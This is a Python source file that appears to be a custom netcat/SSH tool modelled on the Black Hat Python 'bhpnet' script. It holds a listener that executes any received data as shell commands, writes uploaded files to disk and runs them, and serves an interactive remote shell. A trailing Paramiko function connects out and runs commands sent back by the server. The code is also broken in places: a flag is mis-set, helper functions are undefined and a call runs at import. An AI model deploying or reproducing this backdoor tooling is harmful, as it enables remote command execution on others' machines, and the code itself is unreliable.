"""
Limited python implementation of SSHv2 API Paramiko, for a self standing SSH client/server setup

Usage: bhpnet.py -t target_host -p port

-h --help           Show this help page

-t -target          Target IP   (Def : Localhost)

-p -port            Target Port (Def : 9999)

-c --connect        Run as a connecting client, to send commands or files to a listening server

-i --initial=cmd    (Connecting) Connect and send cmd without interaction. Note that a listening
server writes/executes files before running commands

-u --upload=file    (Connecting) Connect and send file via stream without interaction.
Use -i OR -u, client will ignore upload if file is targeted

-l --listen         Run as listening server for incoming connections. Attempts to run any
received data stream/s as commands

-w --write=dest     (Listening) On connection, write first received stream to [dest]

-e --execute=file   (Listening) On connection, after first stream received, execute [file]. Can be
used to run a recently streamed file. (This is the last thing performed on initial connection)

-s --shell          (Listening) Initialize an interactive command shell and send responses to client

-v -verbose        Increased Verbosity


Specific Client Commands:

bhpquit             Disconnect client from listening server

bhpshutdown         Shutdown listening post, disconnect server

Examples:

bhpnet.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe

bhpnet.py -t 192.168.0.1 -p 5555 -c -s=C:\\to_send.exe

bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
"""
import paramiko
import socket
import sys
import getopt
import threading
import subprocess
import getpass
from textwrap import dedent
from typing import Tuple, Union, List, Optional


class Helpers:
    """Static functions, to use as helpers"""

    @staticmethod
    def send_data(receiving_socket: socket.socket, data_stream: bytes) -> None:
        """
        Centralised function to handle sending data stream to receive data. Sends data in consistent
        buffer sizes
        Args:
            receiving_socket: Socket to send stream to
            data_stream: Data stream to send
        """

        data_fragments = []
        for i in range(0, len(data_stream), 4096):
            # Break data stream into byte sized bites
            data_fragments.append(data_stream[i:i + 4096])
        if data_fragments[-1] == 4096:
            # Make sure last fragment isn't BUFFER bytes long
            data_fragments.append(b'\n')
        for frag in data_fragments:
            receiving_socket.send(frag)

    @staticmethod
    def receive_data(sending_socket: socket.socket) -> bytes:
        """
        Centralised fuction to handle receiving one or more packet buffers from TCP socket
        Args:
            sending_socket: Socket sending stream to this instance.
        Returns:
              Complete binary stream from socket
        """
        stream = sending_socket.recv(4096)
        fragments: List[bytes] = [stream]
        while True:
            if len(stream) < 4096:
                break
            else:
                stream = sending_socket.recv(4096)
                fragments.append(stream)
        return b''.join(fragments)

    @staticmethod
    def bin_join(*to_join: Union[str, bytes]) -> bytes:
        """
        Funnel function to reliably concatenate binary and strings into binaries. Can also be used
        to ensure a single item is bytes string

        Args:
            to_join: Item/s to join together. Either bytes or regular strings
        Return:
            Properly concatenated bytes string
        """
        binary_bytes = []
        for item in to_join:
            if not item:
                pass
            elif isinstance(item, int):
                binary_bytes.append(str(item).encode())
            elif isinstance(item, str):
                binary_bytes.append(item.encode())
            else:
                binary_bytes.append(item)
        return b''.join(binary_bytes)

    @staticmethod
    def bin_print(*to_display, end='\n'):
        """
        Funnel function to reliably print binary or regular strings.

        Args:
            to_display: Item/s to join together. Either bytes or regular strings

            end: default print end arg

        """
        for item in to_display:
            try:
                print(item.decode(), end=end)
            except AttributeError:
                print(item, end=end)


class SshcAttributes:
    """Dataclass-like, used to host running SSHCustom's running attributes"""
    # Carries defaults

    @staticmethod
    def usage():
        """Module docstring doubles as --help"""
        print(__doc__)
        exit()

    def __init__(self):
        if __name__ == '__main__' and len(sys.argv) == 1:
            self.usage()

        try:
            opts, args = getopt.getopt(sys.argv[1:], "ht:p:ci:u:lw:e:sv",
                                       ['help', 'target=', 'port=',
                                        'connect', 'initial=', 'upload=',
                                        'listen', 'write=', 'execute=', 'shell', 'verbose'])
            for opt, arg in opts:
                if opt in ('-h', '--help'):
                    self.usage()

                elif opt in ('-t', '--target'):
                    # self.target = arg
                    self.__setattr__('target', arg)

                elif opt in ('-p', '--port'):
                    # self.port = arg
                    self.__setattr__('port', arg)

                elif opt in ('-c', '--connecting'):
                    # self.connecting = True
                    self.__setattr__('connecting', True)

                elif opt in ('-u', '--upload'):
                    # self.upload = arg
                    self.__setattr__('upload', arg)

                elif opt in ('-l', '--listen'):
                    # self.listening = True
                    self.__setattr__('upload', True)

                elif opt in ('-w', '--write'):
                    # self.write_to = arg
                    self.__setattr__('write_to', arg)

                elif opt in ('-e', '--execute'):
                    # self.execute = arg
                    self.__setattr__('execute', arg)

                elif opt in ('-s', '--shell'):
                    # self.shell = True
                    self.__setattr__('shell', True)

                elif opt in ('-v', '--verbose'):
                    # self.verbose = True
                    self.__setattr__('verbose', True)

                elif not self.target or not self.port:
                    raise SyntaxError("Must explicitly state target IP and Port!")

                elif True not in [not self.connecting or not self.listening]:
                    input((not self.connecting or not self.listening))
                    raise SyntaxError("Must explicitly state connecting or listening function!")

                else:
                    raise SyntaxError(f"Unhandled option: {opt}")

        except (getopt.GetoptError, SyntaxError) as err:
            print(err)
            self.usage()

    target: str = '127.0.0.1'
    """Target IP"""
    port: str = 2222
    """Target port"""

    # Connecting functions
    connecting: bool = False
    """Bool to connect to listening server on [host]:[port]"""
    upload: str = ''
    """File to upload to listening server"""
    initial_cmd: str = 'ClientConnected'
    """Start up command to send on initial connect"""

    # Listening functions
    listening: bool = False
    """Bool to listen on [host]:[port] for incoming connections"""
    write_to: str = ''
    """If a client sends a file, write to this destination"""
    execute: str = ''
    """When a client connects, listener will execute this file"""
    shell: bool = False
    """Initialize a shell loop, to run one-off commands by connecting clients"""

    verbose: bool = False
    """Enable on screen verbosity"""

    close_connection: str = 'bhpquit'
    """Specific command to disconnect connected client"""
    shutdown_listening: str = 'bhpshutdown'
    """Specific command to shutdown listening script"""
    listening_active: bool = False
    """Boolean used to keep server alive"""
    timeout: int = 60
    """Listening server's Timeout value"""


class ShutdownListen(socket.error):
    """Custom error used to shutdown listening server"""


class CloseConnection(socket.error):
    """Custom error used to safely disconnect connecting client"""


class SSHCustom:
    """
    Dedicated SSH client and server, designed specifically for windows implementations
    (Note that it's usefullness is arguably lessened by the lastest Win10's built in SSH port)
    See --help for more information
    """

    def __init__(self):
        """
        Custom SSH Client/Server built on Paramiko API. Can be imported or run from command line.
        See Readme or --help for more information
        """

        self.atts: SshcAttributes = SshcAttributes()
        """Attributes module"""

        self.help = Helpers()
        """Helper static functions"""

    # # # Listening functions

    def listening_server(self):
        """
        Start a TCP server socket, spool threads to handle incoming clients
        """

        # Spool listening server
        server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        server.bind((self.atts.target, self.atts.port))
        server.listen(5)

        self.verprint(f"[*] Listening on {self.atts.target}:{self.atts.port}")

        while self.atts.listening_active:
            server_acceptance = server.accept()  # Tuple containing client_socket and addr
            if self.atts.listening_active:
                client_thread = threading.Thread(target=self.listening_handle_connects,
                                                 args=(server_acceptance,))
                client_thread.start()

    def listening_handle_connects(self, connected_client: Tuple[socket.socket, any]):
        """
        Called by server socket in listening_server for each connection.
        File upload, command execution, and/or interactive shell through given client socket

        Args:
            connected_client: Answered socket and address from server.accept()
        """
        client_socket, addr = connected_client
        client_socket.settimeout(self.atts.timeout)
        closing = b''

        try:

            self.verprint(f'--[*] Accepted connection, handler spooled for {addr[0]}:{addr[1]}')
            buffer_stream = self.help.receive_data(client_socket)
            """Received buffer stream from connecting client"""
            response = b''
            """First response to send to connecting client"""

            if not self.atts.write_to:
                # Default first action...
                response = self.help.bin_join(self.run_command(buffer_stream), response)
            elif self.atts.write_to:
                # Or write stream to file instead
                response = self.help.bin_join(self.listening_write_file(buffer_stream), response)

            if self.atts.execute:
                # Try to execute a given file
                response = self.help.bin_join(self.run_command(self.atts.execute), response)

            if not self.atts.shell:
                # Listener not set to init shell. Send response and close
                self.help.send_data(client_socket, self.help.bin_join(
                    response, f"\nClosing connection to {self.atts.target}:{self.atts.port}"))
            else:
                # Initiate shell
                self.listening_shell_loop(client_socket, response)

        except CloseConnection:
            closing = dedent(f"""
            --[*] Client requested connection close
            ----- Closing handler {addr[0]}:{addr[1]}
            """)
        except ShutdownListen:
            closing = dedent(f"""
            --[*] Client {addr[0]}:{addr[1]} requested shutdown listening post
            ----- Shutting down
            """)
            self.atts.listening_active = False
        except Exception as err:
            closing = dedent(f"""
            --[*] Unexpected error: {err}
            ----- Closing handler {addr[0]}:{addr[1]}
            """)
        finally:
            self.verprint(closing)
            # Low effort try to send to connected client
            try:
                self.help.send_data(client_socket, self.help.bin_join(closing))
                client_socket.shutdown(socket.SHUT_RDWR)
                client_socket.close()
            except Exception as err:
                self.verprint(f"Unexpected error while closing handler {addr[0]}:{addr[1]} : ")
                self.verprint(err)

    def listening_check_for_commands(self, stream: bytes):
        """
        Given a datastream, check if a closing command is in it. Raise appropriate handling error

        Args:
            stream: bytes stream sent from connecting client, to check for bhp commands
        """

        # Catch bhp specific commands in stream
        if self.atts.close_connection in str(stream):
            raise CloseConnection
        if self.atts.shutdown_listening in str(stream):
            raise ShutdownListen

    def listening_write_file(self, data_buffer) -> bytes:
        """
        If allowed, Extension to write a caught data_buffer to local file (self.write_to)
        Return feedback to calling functions

        Args:
            data_buffer: listening_handle_connects's received data stream from it's client_socket.
        Returns:
            File write feedback, either successful or failure with error
                if write_to is None (i.e. not set) return empty bytes string
        """

        send_feedback = ''
        if self.atts.write_to:
            try:
                with open(self.atts.write_to, "wb") as file:
                    file.write(data_buffer)
                send_feedback = f"Successfully saved file to {self.atts.write_to}\r\n"

            except Exception as err:
                send_feedback = f"""Failed to save file to {self.atts.write_to}\r\n{err}\r\n"""

        return self.help.bin_join(send_feedback)

    def run_command(self, command: Union[str, bytes, None]) -> bytes:
        """
        Locally run given command using subprocess, and return results as bytes string

        Args:
            command: given command to run
        """
        if not command:
            command_run = ''
        elif isinstance(command, bytes):
            command_run = command.decode()
        else:
            command_run = command

        try:
            output = subprocess.check_output(command_run, stderr=subprocess.STDOUT, shell=True)
        except Exception as err:
            output = dedent(f"""
                Failed to execute command
                Command : {command_run}
                Error   : {err}\r\n""")

        return self.help.bin_join(output)

    def listening_shell_loop(self, client_socket: socket.socket, initial_response: bytes):
        """
        Function to handle one off commands from connecting client. Loops until connection broken.

        Args:
            client_socket: Answered socket to accept shell commands from
            initial_response: Initial response from listening_handle_connects' steps, if any.
                Passed here so shell loop can return, with prompt characters
        """

        response = initial_response
        prompt = f'\n<BHP@{self.atts.target}:{self.atts.port}>#'

        while True:
            # Loop is broken by explicit errors or commands
            self.help.send_data(client_socket, self.help.bin_join(response, prompt))
            try:
                cmd_buffer = self.help.receive_data(client_socket)
                self.listening_check_for_commands(cmd_buffer)
                response = self.run_command(cmd_buffer)
            except TimeoutError:
                raise TimeoutError("Listening server timeout reached")
            except Exception as err:
                raise err

    # # # Connection Functions

    def connecting_client(self):
        """
        Spool up TCP socket, catch return data, prompt for new to_send. Rinse and repeat

        """
        # Create client socket, using IPv4 and TCP socket type
        client = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        try:
            self.verprint(f"Connecting to {self.atts.target}:{self.atts.port}")
            client.connect((self.atts.target, self.atts.port))

            to_send = b''
            if self.atts.initial_cmd:
                to_send = self.help.bin_join(self.atts.initial_cmd)
            elif self.atts.upload:
                to_send = self.help.bin_join(self.connecting_file_stream())

            while True:
                # Loop broken by error or explicit command
                self.help.send_data(client, self.help.bin_join(to_send, '\n'))
                response = self.help.receive_data(client)
                self.help.bin_print('\n', response, end=' ')  # ' ' after shell-sent prompt characters
                to_send = input() + '\n'

        except KeyboardInterrupt as err:
            input(dedent(
                f"""{err}
                Press any key to close..."""))
        except ConnectionRefusedError:
            self.verprint('\nCannot connect, is listening active?')
        except ConnectionAbortedError:
            # Socket closed by listener
            pass
        except ConnectionResetError:
            self.verprint("Connection prematurely closed. Did listening shutdown?")
        finally:
            try:
                client.shutdown(socket.SHUT_RDWR)
                client.close()
            except Exception as err:
                self.verprint(
                    f"Unexpected error when disconnecting from {self.atts.target}:{self.atts.port}")
                self.verprint(err)

    def connecting_file_stream(self):
        """
        Targets file at self.atts.upload and converts to binary stream, to send to listening server
    
        Returns:
                Single binary stream of indicated file
        """
        file_stream = b''
        with open(self.atts.upload, 'rb') as file:
            for ndx, line in enumerate(file):
                file_stream = self.help.bin_join(file_stream, line)
        return file_stream + b'\r\n'

    def verprint(self, *to_print) -> None:
        """
        Default check against verbosity attribute, to see if allowed to print

        Args:
            *to_print: emulation of print *args. pass as normal
        """
        if self.atts.verbose:
            for item in to_print:
                self.help.bin_print(item, end=' ')
            print()

    def main(self):
        """
        Primary logic loop. After init, builds listening post or starts connecting client
        """

        if self.atts.listening:
            # Time to listen, potentially upload items, execute commands, and drop a shell back
            self.listening_server()

        else:
            # Try connecting to target, send a potential starting command
            self.connecting_client()


if __name__ == '__main__':
    nc = SSHCustom()
    nc.main()


def ssh_command(*,
                ip: str = None, port: int = None, user: str = None, password: str = None,
                command: str = None, known_hosts: Optional[str] = None, catch_banner: bool=True):
    """
    Interactive SSH command client, using paramiko API. Designed to connect to matching dedicated
    server

    Args:
        ip:
            target IP                           (Def localhost)
        port:
            target port                         (Def 2222)
        user:
            Username to pass to target IP       (Def running user)
        password:
            password to pass to target IP       (Def '')
        command:
            1st command to send to custom SSH   (Def 'ClientConnected')
        known_hosts:
            Optional key support, using absolute path to .ssh/known_hosts
        catch_banner:
            boolean to tell function to receive banner data before starting command loop
    """

    if not ip:
        ip = 'localhost'
    if not port:
        port = 2222
    if not user:
        user = getpass.getuser()
    if not password:
        password = ''
    if not command:
        command = 'ClientConnected'

    # Bind new SSH client
    client: paramiko.SSHClient = paramiko.SSHClient()
    # Optional key support
    if known_hosts:
        client.load_host_keys(known_hosts)
    # Auto add missing keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Connect
    client.connect(ip, port=port, username=user, password=password)
    # request session channel to server
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        if catch_banner:
            send_data(to_socket=ssh_session, data_stream=command.encode())
            banner = receive_data(from_socket=ssh_session)
            print(banner.decode())

        # Primary loop
        while True:
            server_command = receive_data(from_socket=ssh_session)
            try:
                cmd_output = subprocess.check_output(server_command, shell=True)
                send_data(to_socket=ssh_session, data_stream=cmd_output)
            except Exception as err:
                send_data(to_socket=ssh_session, data_stream=str(err).encode())
                break
        client.close()


ssh_command()
